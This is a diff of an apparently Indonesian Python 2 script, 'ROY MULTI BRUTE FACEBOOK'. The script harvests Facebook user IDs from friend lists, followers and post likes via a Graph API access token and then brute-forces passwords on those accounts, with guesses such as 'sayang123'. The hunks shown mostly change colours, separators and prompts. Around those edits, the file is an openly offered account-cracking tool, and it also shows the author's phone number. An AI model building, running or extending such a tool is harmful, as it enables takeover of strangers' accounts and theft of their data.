@@ -78,10 +78,10 @@ def tod():
 IP = requests.get('https://api.ipify.org').text
 # LOGO
 logo = '''%s ╦═╗╔═╗╦ ╦   ╦═╗╔╦╗╔╗ ╔═╗
- ╠╦╝║ ║╚╦╝───╠╦╝║║║╠╩╗╠╣ 
- ╩╚═╚═╝ ╩    ╩╚═╩ ╩╚═╝╚  %s
-%s %s----------------------------------%s
- [ \x1b[47;30;1m ROY MULTI BRUTE FACEBOOK%s ]'''%(H,M,N,O,N,N)
+ %s╠╦╝║ ║╚╦╝───╠╦╝║║║╠╩╗╠╣ 
+ %s╩╚═╚═╝ ╩    ╩╚═╩ ╩╚═╝╚  %s
+%s %s==================================================%s
+ [ \x1b[47;30;1m ROY MULTI BRUTE FACEBOOK%s ]'''%(M,K,H,M,N,N,N,N)
 # crack selesai
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
@@ -152,12 +152,14 @@ def moch_yayan():
     print ' %s[%s*%s] Author   : %sRoy Octa Firdaus'%(N,H,N,K,)
     print ' %s[%s*%s] Facebook : %sfacebook.com/jbfbold'%(N,H,N,K)
     print ' %s[%s*%s] Whatsapp : %s081318306972'%(N,H,N,K)
-    print ' %s[%s*%s]'%(N,O,N), 30 * '\x1b[1;96m-\x1b[0m'
-    print ' %s[%s*%s] Nama FB : %s%s%s'%(N,O,N,K,nama,N)
-    print ' %s[%s*%s] ID FB   : %s%s%s'%(N,O,N,K,idfb,N)
-    print ' %s[%s*%s] IP Anda : %s%s'%(N,O,N,K,IP)
-    print ' %s[%s*%s]'%(N,O,N), 30 * '\x1b[1;96m-\x1b[0m'
-    print '\n [%s1%s] Crack dari Daftar Teman'%(H,N)
+    print ' %s[%s*%s]'%(N,O,N), 50 * '\x1b[1;97m=\x1b[0m'
+    print ' %s[%s*%s] Nama FB : %s%s%s'%(N,K,N,K,nama,N)
+    print ' %s[%s*%s] ID FB   : %s%s%s'%(N,K,N,K,idfb,N)
+    print ' %s[%s*%s] IP Anda : %s%s'%(N,K,N,K,IP)
+    print ' %s[%s*%s]'%(N,O,N), 50 * '\x1b[1;97m=\x1b[0m'
+    print ' %s[%s*%s]'%(N,O,N), 50 * '\x1b[1;97m=\x1b[0m'
+    print '\n [%s?%s] MENU PILIHAN'%(K,O)
+    print ' [%s1%s] Crack dari Daftar Teman'%(H,N)
     print ' [%s2%s] Crack dari Teman Publik'%(H,N)
     print ' [%s3%s] Crack dari Total Followers'%(H,N)
     print ' [%s4%s] Crack dari Like Postingan'%(H,N)
@@ -193,10 +195,10 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
             elif ask == "1" or ask == "01":
                 try:
                     totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                     print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;92m"%(ha, op, ta,M,H,len(totalok)))
                     os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
-                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print(" \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                     moch_yayan()
                 except (IOError):
                     print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil OK :(")
@@ -205,10 +207,10 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
             elif ask == "2" or ask == "02":
                 try:
                     totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                     print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;93m"%(ha, op, ta,M,K,len(totalcp)))
                     os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
-                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print(" \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                     raw_input(' [%s KEMBALI%s ] '%(O,N))
                     moch_yayan()
                 except (IOError):
@@ -258,8 +260,8 @@ def teman():
         os.mkdir('dump')
     except:pass
     try:
-        mmk = raw_input('\n [?] Nama File  : ')
-        asw = raw_input(' [?] Total ID   : ')
+        mmk = raw_input('\n [%s?%s] Nama File  : '%(K,N))
+        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
         ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
         id = []
         z = json.loads(ihh.text)
@@ -275,7 +277,7 @@ def teman():
 
         ys.close()
         jalan('\n\n %s[%s✓%s] Berhasil dump ID dari teman'%(N,H,N))
-        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(B,N,M,cin,N)
+        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,cin,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
@@ -301,9 +303,9 @@ def publik():
         os.mkdir('dump')
     except:pass
     try:
-        csy = raw_input('\n [?] ID Publik  : ') 
-        ahh = raw_input(' [?] Nama File  : ')
-        ihh = raw_input(' [?] Total ID   : ')
+        csy = raw_input('\n [%s?%s] ID Publik  : '%(K,N)) 
+        ahh = raw_input(' [%s?%s] Nama File  : '%(K,N))
+        ihh = raw_input(' [%s?%s] Total ID   : '%(K,N))
         xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
         id = []
         z = json.loads(xxx.text)
@@ -319,7 +321,7 @@ def publik():
 
         ys.close()
         jalan('\n\n %s[%s✓%s] Berhasil dump ID dari teman publik'%(N,H,N))
-        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(B,N,M,kntl,N)
+        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,kntl,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
@@ -341,9 +343,9 @@ def followers():
         os.mkdir('dump')
     except:pass
     try:
-        csy = raw_input('\n [?] ID Follow  : ')
-        mmk = raw_input(' [?] Nama File  : ')
-        asw = raw_input(' [?] Total ID   : ')
+        csy = raw_input('\n [%s?%s] ID Follow  : '%(K,N))
+        mmk = raw_input(' [%s?%s] Nama File  : '%(K,N))
+        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
         pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
         id = []
         x = json.loads(pok.text)
@@ -359,7 +361,7 @@ def followers():
 
         ys.close()
         jalan('\n\n %s[%s✓%s] Berhasil dump ID dari total followers'%(N,H,N))
-        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(B,N,M,ah,N)
+        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,ah,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
@@ -381,9 +383,9 @@ def postingan():
         os.mkdir('dump')
     except:pass
     try:
-        csy = raw_input('\n [?] ID Posting : ')
-        ppk = raw_input(' [?] Nama File  : ')
-        asw = raw_input(' [?] Total ID   : ')
+        csy = raw_input('\n [%s?%s] ID Posting : '%(K,N))
+        ppk = raw_input(' [%s?%s] Nama File  : '%(K,N))
+        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
         kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,__cindy__))
         id = []
         x = json.loads(kon.text)
@@ -399,7 +401,7 @@ def postingan():
 
         ys.close()
         jalan('\n\n %s[%s✓%s] Berhasil dump ID dari like postingan'%(N,H,N))
-        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(B,N,M,ikeh,N)
+        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,ikeh,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
@@ -418,7 +420,7 @@ def cek_ingfo():
         time.sleep(0.01)
         yayanxd()
     try:
-        ppk = raw_input('\n [?] Masukkan ID FB : ')
+        ppk = raw_input('\n [%s?%s] Masukkan ID FB : '%(K,N))
         if ppk in ('user', 'User', 'USER'):
         	jalan('\n [%s!%s] Anda akan di arahkan ke browser!'%(M,N));time.sleep(2)
         	os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
@@ -536,20 +538,20 @@ def cek_ingfo():
     print ' [*] Tinggal di     :‰ %s'%(tigl);time.sleep(0.03)
     print ' [*] Zona waktu     : %s'%(tzim);time.sleep(0.03)
     print ' [*] Terakhir FB di update : %s'%(uptd);time.sleep(0.03)
-    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
-    jalan('\n [%s✓%s] Berhasil mengechek dataÃ‚Â² akun Facebook\n\n'%(O,N));time.sleep(0.03)
+    print ' %s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m'
+    jalan('\n [%s✓%s] Berhasil mengechek data akun Facebook\n\n'%(O,N));time.sleep(0.03)
     exit()
 # cek info sc
 def info_tools():
     os.system('clear')
-    print '%s[%s#%s]'%(N,O,N), 45 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
+    print '%s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m';time.sleep(0.07)
     print '%s[%s✓%s] Author	: %sRoy Octa Firdaus'%(N,H,N,K);time.sleep(0.07)
     print '%s[%s✓%s] Github	: %sPrivate'%(N,H,N,K);time.sleep(0.07)
     print '%s[%s✓%s] Whatsapp	: %s+6281318306972'%(N,H,N,K);time.sleep(0.07)
     print '%s[%s✓%s] Facebook	: %sfacebook.com/jbfbold'%(N,H,N,K);time.sleep(0.07)
     print '%s[%s✓%s] Fanspage	: %sfacebook.com/infoappdangame'%(N,H,N,K);time.sleep(0.07)
     print '%s[%s✓%s] Website	: %swww.royjbfbold.my.id'%(N,H,N,K);time.sleep(0.07)
-    print '%s[%s#%s]'%(N,O,N), 45 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
+    print '%s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m';time.sleep(0.07)
     raw_input('[%s KEMBALI%s ]'%(O,N))
     moch_yayan()
 # mulai ngecrot awokawokawokkawok
@@ -560,7 +562,7 @@ class __crack__:
 
     def slurr(self):
         try:
-            self.apk = raw_input('\n [?] Masukkan Nama File : ')
+            self.apk = raw_input('\n [%s?%s] Masukkan Nama File : '%(K,N))
             self.id = open(self.apk).read().splitlines()
             print '\n [+] Menghitung Total ID : %s%s%s' %(M,len(self.id),N)
         except:
@@ -568,11 +570,11 @@ class __crack__:
             time.sleep(3)
             moch_yayan()
 
-        ___yayanganteng___ = raw_input(' [?] Apakah ingin menggunakan kata sandi manual? [Y/T]: ')
+        ___yayanganteng___ = raw_input(' [%s?%s] Apakah ingin menggunakan kata sandi manual? [Y/T]: '%(K,N))
         if ___yayanganteng___ in ('Y', 'y'):
             print '\n [*] Contoh: %s[ %ssayang,sayang123,roy123%s ]'%(N,H,N)
             while True:
-                pwek = raw_input('\n [?] Sandi Manual : ')
+                pwek = raw_input('\n [%s?%s] Sandi Manual : '%(K,N))
                 print ' [*] Crack dengan Sandi Manual : [ %s%s%s ]' % (M, pwek, N)
                 if pwek == '':
                     self.slurr()
@@ -635,20 +637,20 @@ class __crack__:
                             time.sleep(2)
                             moch_yayan()
                     print '\n [ Pilih Method login Anda. Silahkan coba satu² ]\n'
-                    print ' [1] Method API (Proses Cepat)'
-                    print ' [2] Method mbasic (Proses Slow)'
-                    print ' [3] Method mobile (Proses Sangat Slow)'
+                    print ' %s[%s1%s] Method API (%sProses Cepat%s)'%(N,H,N,M,N)
+                    print ' %s[%s2%s] Method mbasic (%sProses Slow%s)'%(N,H,N,K,N)
+                    print ' %s[%s3%s] Method mobile (%sProses Sangat Slow%s)'%(N,H,N,H,N)
                     __yan__(pwek.split(','))
                     break
 
         elif ___yayanganteng___ in ('T', 't'):
             print '\n [ Pilih Method login Anda. Silahkan coba satu² ]\n'
-            print ' [1] Method API (Proses Cepat)'
-            print ' [2] Method mbasic (Proses Slow)'
-            print ' [3] Method mobile (Proses Sangat Slow)'
+            print ' %s[%s1%s] Method API (%sProses Cepat%s)'%(N,H,N,M,N)
+            print ' %s[%s2%s] Method mbasic (%sProses Slow%s)'%(N,H,N,K,N)
+            print ' %s[%s3%s] Method mobile (%sProses Sangat Slow%s)'%(N,H,N,H,N)
             self.__pler__()
         else:
-            print '\n %s[%sx%s] y/t goblok!'%(N,M,N)
+            print '\n %s[%sx%s] y/t !'%(N,M,N)
             time.sleep(2)
             moch_yayan()
         return
